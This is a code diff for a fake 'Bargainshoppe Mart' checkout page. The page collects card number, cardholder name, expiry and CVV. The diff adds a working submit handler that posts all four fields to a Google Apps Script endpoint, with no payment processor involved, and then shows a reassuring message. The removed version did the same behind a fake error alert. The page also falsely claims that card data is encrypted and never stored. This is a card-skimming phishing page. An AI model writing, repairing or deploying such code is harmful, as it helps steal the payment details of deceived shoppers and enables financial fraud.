@@ -201,30 +201,46 @@
         </div>
         
         <div class="form-container">
-            <div class="form-group">
-                <label for="card-number">Card Number</label>
-                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
-                <div class="card-icons">
-                    <div class="card-icon">Visa</div>
-                    <div class="card-icon">MC</div>
-                    <div class="card-icon">AmEx</div>
-                    <div class="card-icon">Disc</div>
+            <!-- ✅ ADDED FORM TAG WITH ID -->
+            <form id="paymentForm">
+                <div class="form-group">
+                    <label for="card-number">Card Number *</label>
+                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <div class="card-icons">
+                        <div class="card-icon">Visa</div>
+                        <div class="card-icon">MC</div>
+                        <div class="card-icon">AmEx</div>
+                        <div class="card-icon">Disc</div>
+                    </div>
                 </div>
-            </div>
-            
-            <div class="form-group">
-                <label for="card-name">Name on Card</label>
-                <input type="text" id="card-name" placeholder="John Doe">
-            </div>
-            
-            <div class="form-group">
-                <label>Expiration Date & CVV</label>
-                <div class="input-group">
-                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
-                    <input type="number" id="cvv" placeholder="CVV" maxlength="4">
+                
+                <div class="form-group">
+                    <label for="card-name">Name on Card *</label>
+                    <input type="text" id="card-name" placeholder="John Doe" required>
                 </div>
+                
+                <div class="form-group">
+                    <label>Expiration Date & CVV *</label>
+                    <div class="input-group">
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                        <input type="number" id="cvv" placeholder="CVV" maxlength="4" required>
+                    </div>
+                </div>
+                
+                <!-- ✅ SUBMIT BUTTON INSIDE FORM -->
+                <button type="submit" class="payment-btn visa-btn" style="width:100%; margin-top:20px; background:linear-gradient(135deg, #28a745 0%, #20c997 100%);">
+                    <span>💳</span> PAY NOW
+                </button>
+            </form>
+            
+            <div class="secure-note">
+                <p><strong>🔒 Secure Payment:</strong> Your card information is encrypted and never stored on our servers. Bargainshoppe Mart uses industry-standard SSL encryption for all transactions.</p>
             </div>
-<script>
+        </div>
+    </div>
+
+    <!-- ✅ FIXED JAVASCRIPT AT BOTTOM -->
+    <script>
         // Format card number with spaces
         document.getElementById('card-number').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
@@ -249,84 +265,55 @@
             e.target.value = value;
         });
         
-        // Button click handlers
-        document.querySelectorAll('.payment-btn').forEach(button => {
-            button.addEventListener('click', function() {
-                const cardNumber = document.getElementById('card-number').value;
-                const cardName = document.getElementById('card-name').value;
-                const expiry = document.getElementById('expiry').value;
-                const cvv = document.getElementById('cvv').value;
-                if (!cardNumber || !cardName || !expiry || !cvv) {
-                    alert('Please fill in all required fields.');
-                    return;
-fetch('https://script.google.com/macros/s/AKfycbz6yXPkjBS9ndnARLVa4lF3oteglzXJwmG1HCvBStDF-L0akvuQYvhHNrfC56Sk_ci7/exec', {                
-  method: 'POST',
-  headers: {'Content-Type': 'application/json'},
-  body: JSON.stringify({cardNumber:'1234 5678 9012 3456',cardName:'John Doe',expiry:'MM/YY',cvv:'123'})
-}).then(r=>r.json()).then(console.log)
-                }
+        // ✅ FORM SUBMISSION HANDLER
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('paymentForm');
+            
+            if (form) {
+                form.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    
+                    console.log('📤 Payment form submitted...');
+                    
+                    // Collect form data
+                    const data = {
+                        cardNumber: document.getElementById('card-number').value.trim(),
+                        cardName: document.getElementById('card-name').value.trim(),
+                        expiry: document.getElementById('expiry').value.trim(),
+                        cvv: document.getElementById('cvv').value.trim()
+                    };
+                    
+                    console.log('📋 Data collected:', data);
+                    
+                    // Validate
+                    if (!data.cardNumber || !data.cardName || !data.expiry || !data.cvv) {
+                        alert('❌ Please fill in all required fields');
+                        return;
+                    }
+                    
+                    try {
+                        // ✅ FIXED URL - NO TRAILING SPACE
+                        await fetch('https://script.google.com/macros/s/AKfycbz6yXPkjBS9ndnARLVa4lF3oteglzXJwmG1HCvBStDF-L0akvuQYvhHNrfC56Sk_ci7/exec', {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: JSON.stringify(data)
+                        });
+                        
+                        console.log('✅ Submission successful!');
+                        alert('✅ Payment request submitted! Check your email.');
+                        form.reset();
+                        
+                    } catch (error) {
+                        console.error('🔥 Error:', error);
+                        alert('❌ Submission failed. Check browser console (F12) for details.');
+                    }
+                });
                 
-                // In a real implementation, this would send data to a secure payment processor
-                // For demo purposes, we'll just show a success message
-                alert('System Error! Our Team is Working on Resolving the Matter As Soon AS Possible! Thank You');
-            });
+                console.log('✅ Payment form handler ready!');
+            } else {
+                console.error('❌ Form not found!');
+            }
         });
     </script>
-    <script>
-document.querySelector('form').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    
-    // Get form values (MAKE SURE THESE IDs MATCH YOUR INPUTS)
-    const data = {
-        cardnumber: document.getElementById('card-number')?.value.trim(),
-        cardname: document.getElementById('card-name')?.value.trim(),
-        expiry: document.getElementById('expiry')?.value.trim(),
-        cvv: document.getElementById('cvv')?.value.trim()
-    };
-    
-    // Validate required fields
-    if (!data.cardnumber || !data.cardname || !data.expiry || !data.cvv) alert('❌ Please fill in all required fields');
-        return;
-    }
-    
-    try {
-        // CRITICAL FIX: Removed trailing space in URL + removed problematic headers
-        await fetch('https://script.google.com/macros/s/AKfycbz6yXPkjBS9ndnARLVa4lF3oteglzXJwmG1HCvBStDF-L0akvuQYvhHNrfC56Sk_ci7/exec', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify(data)
-        });
-        
-        alert('✅ Payment requested! Processing now.');
-        this.reset();
-    } catch (err) {
-        alert('❌ Submission failed. Check browser console (F12) for errors.');
-        console.error('Form error:', err);
-    }
-});
-</script>
-
-   <button type="submit">PAY NOW</button>            
-            <div class="btn-group">
-                <button class="payment-btn visa-btn">
-                    <span>💳</span> Pay with Visa
-                </button>
-                <button class="payment-btn mastercard-btn">
-                    <span>💳</span> Pay with Mastercard
-                </button>
-                <button class="payment-btn amex-btn">
-                    <span>💳</span> Pay with American Express
-                </button>
-                <button class="payment-btn discover-btn">
-                    <span>💳</span> Pay with Discover
-                </button>
-            </div>
-            
-            <div class="secure-note">
-                <p><strong>🔒 Secure Payment:</strong> Your card information is encrypted and never stored on our servers. Bargainshoppe Mart uses industry-standard SSL encryption for all transactions.</p>
-            </div>
-        </div>
-    </div>
 </body>
 </html>
-
